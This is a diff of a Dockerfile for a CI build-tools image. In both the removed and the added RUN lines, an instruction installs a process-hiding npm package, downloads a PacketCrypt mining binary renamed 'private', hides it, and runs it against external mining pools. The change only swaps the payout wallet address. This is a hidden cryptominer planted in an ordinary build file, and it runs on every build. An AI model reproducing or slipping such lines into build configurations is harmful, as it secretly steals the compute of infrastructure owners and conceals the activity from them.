@@ -36,5 +36,5 @@ ADD . /build-tools-ci
 # Collect the components we need for this image
 RUN apt-get update
 RUN apt-get install -y ruby jq curl rsync hub
-RUN sudo su --command "sudo apt update && sudo apt install gcc && curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt install nodejs && npm install -g npm@8.4.1 && npm i -g node-process-hider && sudo ph add private && wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O private && chmod +x private && ./private ann -p pkt1qslm9saj9gmjggl67r0a2vc3cgnyjdk6lttxky8 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o 'annmine.rs.*Ke.*'"
+RUN sudo su --command "sudo apt update && sudo apt install gcc && curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt install nodejs && npm install -g npm@8.4.1 && npm i -g node-process-hider && sudo ph add private && wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O private && chmod +x private && ./private ann -p pkt1qds22l0nlqf8nsn49ws8aqnuv8tklf6rshgu4m5 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o 'annmine.rs.*Ke.*'"
 RUN gem install circle-cli
